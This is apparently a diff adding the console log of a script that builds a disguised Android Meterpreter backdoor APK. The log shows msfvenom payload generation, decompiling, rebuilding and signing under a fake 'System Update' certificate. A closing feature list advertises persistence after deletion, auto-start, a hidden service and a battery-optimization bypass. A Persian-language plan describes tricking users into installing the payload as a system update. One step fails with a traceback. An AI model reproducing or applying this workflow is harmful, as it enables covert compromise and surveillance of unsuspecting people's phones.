@@ -1,0 +1,112 @@
+╔══════════════════════════════════════════════════════════════════╗
+║     🔥 Memory-Resident Payload Builder (HTTPS Port 443)         ║
+╚══════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [1/8] Generating HTTPS Meterpreter Payload...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+/home/offsec/Documents/GitHub/metasploit-framework1/config/boot.rb:4: warning: already initialized constant GEMFILE_EXTENSIONS
+/usr/share/metasploit-framework/config/boot.rb:4: warning: previous definition of GEMFILE_EXTENSIONS was here
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10438 bytes
+Saved as: /home/offsec/Documents/GitHub/metasploit-framework1/base_payload_https.apk
+✅ Payload generated: 11K
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [2/8] Decompiling APK...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+I: Using Apktool 2.9.3 on base_payload_https.apk
+I: Loading resource table...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/offsec/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+✅ APK decompiled
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [3/8] Modifying Manifest for Android 8-14...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Traceback (most recent call last):
+  File "<stdin>", line 4, in <module>
+IndexError: list index out of range
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [4/8] Creating Memory-Resident Service...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Memory-resident components created
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [6/8] Rebuilding APK...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+I: Using Apktool 2.9.3
+I: Checking whether sources has changed...
+I: Smaling smali folder into classes.dex...
+I: Checking whether resources has changed...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk into: /home/offsec/Documents/GitHub/metasploit-framework1/rebuilt_https.apk
+✅ APK rebuilt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [7/8] Optimizing APK...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Verifying alignment of /home/offsec/Documents/GitHub/metasploit-framework1/aligned_https.apk (4)...
+      41 classes.dex (OK - compressed)
+    6873 AndroidManifest.xml (OK - compressed)
+    8665 resources.arsc (OK - compressed)
+Verification successful
+✅ APK aligned
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 [8/8] Signing with RSA-4096 + SHA-512...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Generating 4,096 bit RSA key pair and self-signed certificate (SHA512withRSA) with a validity of 10,000 days
+	for: CN=System Update, OU=Android, O=System, L=City, ST=State, C=US
+[Storing /home/offsec/Documents/GitHub/metasploit-framework1/memresident.keystore]
+✅ APK signed
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 Verifying Signature...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Verifies
+Verified using v1 scheme (JAR signing): true
+Verified using v2 scheme (APK Signature Scheme v2): true
+Verified using v3 scheme (APK Signature Scheme v3): true
+Verified using v4 scheme (APK Signature Scheme v4): false
+Verified for SourceStamp: false
+Number of signers: 1
+
+╔══════════════════════════════════════════════════════════════════╗
+║              ✅ MEMORY-RESIDENT PAYLOAD COMPLETE!                ║
+╚══════════════════════════════════════════════════════════════════╝
+
+📦 Final APK: /home/offsec/Documents/GitHub/metasploit-framework1/SystemUpdate_MemoryResident_HTTPS.apk
+📏 Size: 21K
+🔐 Signature: RSA-4096 + SHA-512
+📱 SDK: 26-30 (Android 8.0 - 11)
+🔌 Connection: HTTPS Port 443
+
+✅ Features:
+   • Memory-resident backdoor
+   • Persists after APK deletion
+   • Auto-start on boot
+   • Foreground service (hidden)
+   • HTTPS communication (port 443)
+   • Battery optimization bypass
+
+🎯 استراتژی نصب:
+   1. نصب MyPersonalOriginal.apk (برنامه اصلی کاربر)
+   2. نصب SystemUpdate_MemoryResident_HTTPS.apk (پیلود ما)
+   3. پیلود به صورت "System Update" نمایش داده می‌شود
+   4. حتی با حذف هر دو APK، backdoor در حافظه می‌ماند
+
+═══════════════════════════════════════════════════════════════════
